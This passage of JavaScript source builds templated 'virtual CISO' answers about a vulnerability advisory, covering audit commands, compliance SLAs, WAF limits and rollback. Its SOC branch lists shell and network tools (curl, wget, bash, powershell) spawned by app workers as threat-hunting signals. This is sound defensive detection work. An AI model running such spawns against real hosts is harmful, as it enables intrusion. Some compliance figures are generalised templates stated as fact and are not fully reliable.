  if (isCompliance) {
    return `### 📋 Compliance, Governance & Audit Advisory

**Regulatory & Framework Impact:**
- **SOC 2 Type II / ISO 27001:** Requires continuous vulnerability management and adherence to defined remediation SLAs. Failure to remediate a known ${advisory.severity} vulnerability within defined SLA windows will be flagged as an audit exception.
- **PCI-DSS 4.0 (Requirement 6.3.3):** Requires all "Critical" and "High" security vulnerabilities to be patched within **30 days** of public release (with internet-facing zero-days expected within **24–72 hours**).
- **Cyber Insurance Requirements:** Major cyber underwriters mandate that KEV-listed or 9.0+ CVSS vulnerabilities with public exploits be addressed promptly to maintain policy coverage validity in case of breach.

**Standard CISO Remediation Timelines:**
• **Critical / KEV Flaws:** Remediation SLA: **24 to 48 Hours**
• **High Severity Flaws:** Remediation SLA: **7 Days**
• **Medium Severity Flaws:** Remediation SLA: **30 Days (Standard Sprint)**

**Audit Trail Documentation:**
Record the following evidence in your ticketing system (Jira/ServiceNow):
1. Timestamp when ${advisory.uviId} was ingested and triaged.
2. Pull request or deployment ID applying the fix (${fixedVersion}).
3. Verification test log confirming successful deployment.`;
  }

  // 6. Testing, Verification, Commands & Scans
  if (isTestOrScan) {
    return `### 🧪 Verification & Audit Playbook for Engineering Teams

**How to verify if your systems or codebases are affected:**

1. **Dependency Audit Commands (Run in repository roots):**
\`\`\`bash
# Audit package dependencies across your repositories
# Node.js:
npm audit --audit-level=high
# Python:
pip-audit || pip list | grep -i "${affectedProduct.split(' ')[0]}"
# Go:
govulncheck ./...
# Rust:
cargo audit
\`\`\`

2. **Filesystem Search for Affected Files:**
\`\`\`bash
# Search for referenced package or library names across local configs
grep -rn "${affectedProduct.split(' ')[0]}" . --exclude-dir={node_modules,.git,vendor,dist}
\`\`\`

3. **Post-Patch Verification Test:**
${briefing.technicalRemediation.verificationTest}

4. **Runtime Health Check:**
After updating to version \`${fixedVersion}\`, monitor application error logs for 15 minutes to verify that no class loading, deserialization, or dependency resolution exceptions are thrown.`;
  }

  // 7. Detection, SOC Logging, SIEM & Indicators of Compromise (IoCs)
  if (isSocLogging) {
    return `### 🔍 SOC Detection & Threat Hunting Playbook: ${advisory.uviId}

**What to Hunt For in Your SIEM & Logs:**
1. **Application & Ingress Access Logs:**
   - Search for anomalous request payloads containing unexpected special characters, protocol specifiers, or encoding wrappers related to **${advisory.cwe || 'untrusted input'}**.
   - Inspect web server access logs (NGINX, Envoy, Apache, API Gateway) for HTTP 400/500 bursts associated with exploit probing.

2. **Suspicious Child Process Spawns (EDR / Sysmon / Auditd):**
   - Look for the parent process of **${affectedProduct}** spawning interactive shells:
     - Windows: \`powershell.exe\`, \`cmd.exe\`, \`wscript.exe\` spawned by developer or web runtimes.
     - Linux: \`/bin/sh\`, \`/bin/bash\`, \`python3\`, \`curl\`, \`wget\` spawned by application worker processes.

3. **Egress Network Connections:**
   - Alert on unexpected outbound DNS queries or TCP connections initiated by ${affectedProduct} to external untrusted IPs, especially over non-standard ports.

4. **Quick Log Hunting Command:**
\`\`\`bash
# Search recent system and container logs for indicators
journalctl -u ${affectedProduct} -S -24h | grep -Ei "(error|fatal|exception|denied|probe|exploit)"
\`\`\`

*CISO Forensic Recommendation:* If suspicious anomalous spawns or egress connections are detected from affected hosts, isolate the container/VM immediately, preserve volatile memory for forensics, and rotate all credentials stored in environment variables on that instance.`;
  }

  // 8. Authentication, Authorization & Pre-Auth vs Post-Auth
  if (isAuth) {
    return `### 🔐 Authentication & Access Preconditions Analysis

**Authentication Requirements:**
- **Privileges Required:** **${advisory.privilegesRequired}**
- **User Interaction Required:** **${advisory.userInteraction}**
- **Attack Vector:** **${advisory.attackVector}**

**Can this be exploited anonymously by any internet user?**
${isZeroPriv && isNetwork ? `🚨 **YES — Unauthenticated Remote Vector:**
This vulnerability is **pre-authentication**. An attacker does NOT need a user account, password, API key, or valid session. Any external party who can send packets to the exposed port or web interface can trigger the exploit mechanism.` : isZeroPriv ? `⚠️ **Zero-Privilege Required:**
While authentication is not required, the attack vector is **${advisory.attackVector}**, meaning the attacker must have local access, adjacent network access, or trick a user into executing malicious input.` : `🛡️ **Post-Authentication Vector:**
The attacker must already possess **${advisory.privilegesRequired}** privileges (a valid user login, API key, or role) before they can reach the vulnerable execution path. However, note that compromised guest credentials, self-registered users, or SSRF pivots could fulfill this requirement.`}

**Identity & Access Management (IAM) Impact:**
${advisory.scope === "CHANGED" ? `• **Scope Change:** Exploiting this flaw crosses security boundaries, allowing unauthorized privilege escalation beyond the application's intended role structure.` : `• **Standard Scope:** Exploitation operates within the application's privilege context, but can lead to credential extraction or session hijacking.`}`;
  }

  // 9. Network Architecture, VPC, Firewalls & WAF
  if (isNetworkBoundary) {
    return `### 🌐 Network Perimeter, Firewall & WAF Defense Strategy

**Perimeter Exposure Analysis:**
- **Attack Vector:** **${advisory.attackVector}**
- **Attack Complexity:** **${advisory.attackComplexity}**

**Will our Web Application Firewall (WAF) protect us?**
- **Partial Shield (Heuristic Only):** While WAF rules (such as OWASP Core Rule Set) can block common canonical exploit signatures, advanced attackers routinely use encoding bypasses (URL encoding, unicode escapes, nested base64, protocol chunking) that slip through signature inspection. A WAF is a helpful speedbump, not a permanent fix.

**Internal Network & VPC Exposure:**
- **Intranet / VPC Risk:** Even if ${affectedProduct} is hosted on an internal private subnet behind a VPN, it remains vulnerable to:
  1. **Server-Side Request Forgery (SSRF):** Attackers targeting public-facing microservices can proxy requests to internal backend endpoints.
  2. **Developer Workstation Pivoting:** Compromised developer laptops connected via VPN can inadvertently expose internal listeners.
  3. **DNS Rebinding:** Malicious websites opened in developer browsers can rebind hostnames to \`127.0.0.1\` or internal private RFC-1918 IPs.

**Recommended Network Hardening:**
1. Enforce strict **Egress Filtering**: Block outbound connections from application servers to the public internet except for explicit allowlisted endpoints (e.g. package repositories, payment gateways).
2. Segment database and sensitive microservice subnets so they cannot be reached directly by general web worker nodes.`;
  }

  // 10. Developer Workstations, Laptops, IDEs & CI/CD Pipelines
  if (isDevWorkstation) {
    const buildRisk = advisory.ideBuildImpact;
    return `### 💻 Developer Workstation & CI/CD Pipeline Impact

**Are developer laptops and build runners at risk?**
${buildRisk.hasDirectBuildImpact ? `⚠️ **HIGH WORKSTATION & BUILD EXPOSURE:**
This threat directly exposes developer environments and build automation!
- **Workstation Vector:** ${buildRisk.workstationVector}
- **Build Pipeline Risk:** ${buildRisk.buildPipelineRisk}
- **Developer Environment Severity:** **${buildRisk.severityOnDeveloperEnv}**` : `🛡️ **Standard Production Exposure:**
While developer workstations are not the primary target surface, local test runs, mock servers, or local integration testing can inadvertently mirror the vulnerability.`}

**How Developer Workstations Get Compromised:**
1. **Repository Hooks & Build Scripts:** Cloned repositories containing untrusted dependencies or malicious \`postinstall\`, \`Makefile\`, or Gradle tasks execute commands silently with the developer's full local OS privileges.
2. **Localhost Socket Exposure:** Background developer daemons or debug listeners (e.g. ports 3000, 8080, 9222) can be probed by malicious websites visited in the developer's browser via cross-origin WebSockets or DNS rebinding.

**Specific Guidance for Engineering Teams:**
- **Workstation Hardening:** ${buildRisk.recommendationForIdeBuilds}
- **CI/CD Hygiene:** Ensure GitHub Actions or Jenkins runners run as ephemeral containers with restricted host permissions. Never grant self-hosted runners write access to production IAM roles or long-lived deployment secrets.`;
  }

  // 11. Active Exploitation, Threat Actors, KEV & 0-Day Status
  if (isThreatIntelOrKev) {
    return `### 🚨 Threat Intelligence & In-The-Wild Threat Actor Activity

**CISA Known Exploited Vulnerabilities (KEV) Status:**
${isKev ? `🔥 **CONFIRMED ACTIVE IN-THE-WILD EXPLOITATION (CISA KEV LISTED):**
- **CISA Verdict:** Federal agencies and critical infrastructure are under mandatory binding directive to patch this flaw immediately.
- **Threat Landscape:** Automated cybercrime rings, ransomware affiliates, and initial access brokers (IABs) actively scan the IPv4 space for exposed targets running ${affectedProduct}.` : `📋 **NOT CURRENTLY ON CISA KEV LIST:**
- While not yet flagged by CISA as actively exploited in mass campaigns, weaponization proof-of-concepts (PoCs) or researcher disclosures indicate high weaponization potential.
- CVSS Score: **${advisory.cvssScore.toFixed(1)} / 10.0** (${advisory.severity}).`}

**Attacker Ecosystem Profile:**
- **Weaponization Vector:** ${advisory.attackComplexity === "LOW" ? "Low technical complexity means script-kiddies and automated botnet scanners can easily weaponize public PoCs." : "Requires chained exploits or targeted reconnaissance, characteristic of advanced threat groups."}
- **Ransomware & Extortion Risk:** Vulnerabilities with remote execution or credentials exposure are rapidly weaponized by ransomware syndicates for initial access within 48–72 hours of public disclosure.`;
  }

  // 12. Data Impact, Confidentiality, Exfiltration & Blast Radius
  if (isDataOrBlastRadius) {
    return `### 💥 Blast Radius & Data Confidentiality Assessment

**Worst-Case Impact Scenario:**
${briefing.businessImpact.worstCaseScenario}

**Can an attacker access or exfiltrate our customer data?**
- **Mechanism:** ${isRce ? `Because this vulnerability involves arbitrary code execution or process hijacking, an attacker can run commands in the context of the running application. This grants them read access to anything the application can access—including active database connection pools, environment variables (\`DATABASE_URL\`, \`SECRET_KEY_BASE\`), AWS S3 tokens, and local cached data.` : `This vulnerability targets ${advisory.cwe || 'application logic'}. Depending on application architecture, an attacker can manipulate application state, read unauthorized records, or cause systemic service disruption.`}

**Specific Blast Radius Breakdown:**
1. **Confidentiality:** ${advisory.cvssVector.includes("/C:H") ? "🔴 **HIGH** — Full disclosure of sensitive data, configuration keys, and memory contents." : "🟡 **MODERATE** — Partial or scoped data leakage possible."}
2. **Integrity:** ${advisory.cvssVector.includes("/I:H") ? "🔴 **HIGH** — Attacker can modify records, tamper with configurations, or inject backdoors." : "🟡 **MODERATE** — Limited file or parameter tampering."}
3. **Availability:** ${advisory.cvssVector.includes("/A:H") ? "🔴 **HIGH** — Potential for crash loops, resource starvation, or denial of service." : "🟢 **LOW** — Minimal operational uptime impact."}

*CISO Defense Check:* Ensure database credentials utilize least-privilege schemas and enable AWS GuardDuty / CloudTrail anomaly alerts for unexpected mass database exports.`;
  }

  // 13. Rollback, Compatibility & Regression Risks (Breaking changes)
  if (isRollbackOrBreakage) {
    return `### 🔄 Rollback & Regression Risk Assessment

**Will upgrading to ${fixedVersion} break our application?**
- **SemVer Risk Analysis:** Minor and patch releases (e.g. \`1.2.3\` to \`1.2.4\`) typically preserve backward compatibility and public API signatures. Major version jumps may include deprecated function removals or stricter input validation schemas.
- **Stricter Parsing Expectations:** Security patches often enforce stricter input sanitization or disable legacy insecure protocols by default. If your legacy code relied on lax input formatting, you may encounter validation errors.

**Zero-Risk Deployment Strategy:**
1. **Canary / Staging Deployment:** Deploy the updated package to a staging or pre-production cluster first.
2. **Automated Integration Test Suite:** Run your end-to-end integration and API smoke tests against the canary instance.
3. **Rollback Contingency Plan:**
   - Keep the previous stable container image or artifact tag tagged in your registry.
   - If unexpected regressions occur in production, execute a fast rollback:
     \`kubectl rollout undo deployment/<service-name>\` or revert the lockfile commit.
   - Concurrently apply the interim workaround (network restriction or WAF filter) so you remain shielded while fixing the regression.`;
  }

  // 14. Language & Package Ecosystem Details
  if (isEcosystemNuance) {
    return `### 📦 Package Ecosystem & Dependency Tree Analysis

**Ecosystem:** **${advisory.affectedTargets[0]?.ecosystem || 'Software Engineering Toolchain'}**
**Affected Component:** **${affectedProduct}** (${affectedVersions})
**Patched Target:** **${fixedVersion}**

**Transitive Dependency Hazards:**
Even if \`${affectedProduct}\` is not explicitly listed in your top-level \`package.json\`, \`requirements.txt\`, or \`pom.xml\`, it may be pulled in as a **transitive dependency** by another library or developer plugin!

**How to Inspect Your Deep Dependency Tree:**
\`\`\`bash
# Node / JavaScript:
npm ls ${affectedProduct.split(' ')[0]} || yarn why ${affectedProduct.split(' ')[0]}

# Python:
pipdeptree -p ${affectedProduct.split(' ')[0]}

# Java / Maven:
mvn dependency:tree -Dincludes=*${affectedProduct.split(' ')[0]}*

# Go:
go mod why -m ${affectedProduct.split(' ')[0]}
\`\`\`

**Resolution:**
If pulled in transitively, override the resolution in your lockfile (e.g. via \`overrides\` in package.json or \`dependencyManagement\` in pom.xml) to pin the dependency to **${fixedVersion}**.`;
  }

  // 15. Mechanism Explanation
  if (isMechanismExplanation) {
    return `### 🔬 Detailed Exploitation Mechanism Breakdown

**Plain-English Overview:**
${briefing.plainEnglishSummary}

**Step-by-Step Attack Flow:**
${briefing.attackFlow.map(s => `${s.icon} **Step ${s.step}: ${s.title}** — ${s.description}`).join("\n")}

**Architectural Root Cause:**
The underlying weakness is classified under **${advisory.cwe || 'system architecture flaw'}**. When unvalidated input crosses the trust boundary into **${affectedProduct}**, execution flow is hijacked before defensive bounds-checking takes effect.`;
  }

  // 16. Intelligent NLP Dynamic Synthesis for Custom Open-Ended Inquiries
  // Extract key topic nouns and formulate a tailored, multi-faceted CISO response
  const stopWords = new Set([
    'what', 'when', 'where', 'which', 'who', 'whom', 'whose', 'why', 'how',
    'could', 'would', 'should', 'about', 'their', 'there', 'these', 'those',
    'doing', 'being', 'having', 'give', 'tell', 'with', 'from', 'this', 'that',
    'have', 'does', 'interact', 'affect', 'relate', 'impact', 'mean', 'work',
    'into', 'like', 'some', 'also', 'will', 'than', 'them', 'then', 'they',
    'ours', 'your', 'ourselves', 'yourselves', 'help', 'know', 'think', 'explain',
    'show', 'please', 'our', 'and', 'the', 'for', 'are', 'was', 'were', 'been',
    'can', 'any'
  ]);
  const sanitizedWords = question
    .replace(/[?.,!/\\;:'"()]/g, ' ')
    .split(/\s+/)
    .filter(w => w.length > 2 && !stopWords.has(w.toLowerCase()));
  const focusTopic = sanitizedWords.slice(0, 4).join(" ") || "your inquiry";

  return `### 🛡️ Virtual CISO Assessment: "${question}"

**1. Direct CISO Ruling on ${focusTopic.toUpperCase()}:**
In evaluating how **${advisory.title}** (${advisory.uviId}) relates specifically to **"${question}"**:
${isNetwork ? `Because this threat operates across the **NETWORK** boundary with **${advisory.privilegesRequired}** privileges required, any architecture or component involving ${focusTopic} that receives or processes external untrusted input must be treated as directly exposed.` : `Because this vector is **${advisory.attackVector}** (${advisory.attackComplexity} complexity), ${focusTopic} is primarily at risk if untrusted files, repository code, or unvetted scripts are executed within that local environment.`}

**2. Threat Architecture & Blast Radius:**
- **Vulnerability Mechanism:** ${advisory.headline}
- **Attack Classification:** ${advisory.cwe || 'Application Input Validation Flaw'} affecting **${affectedProduct}** (${affectedVersions}).
- **Operational Domain:** **${advisory.domainCategory}**
- **Potential Exposure for ${focusTopic}:** ${isRce ? `If ${focusTopic} runs within the process execution boundary of ${affectedProduct}, an attacker achieving code execution can read environment variables, steal local API tokens, and attempt lateral movement.` : `The primary impact involves potential data tampering, unauthorized parameter manipulation, or service disruption (${briefing.businessImpact.worstCaseScenario}).`}

**3. Strategic Action Plan:**
1. **Targeted Inspection:** Verify whether ${focusTopic} directly packages or interfaces with **${affectedProduct}** (${affectedVersions}).
2. **Remediation Priority:** Upgrade affected components to **${fixedVersion}** (${briefing.businessImpact.urgencyBadge}).
3. **Defensive Verification:** ${briefing.technicalRemediation.verificationTest}

*Have a specific follow-up on your tech stack, network ingress, or compliance timeline? Type your question below.*`;
}
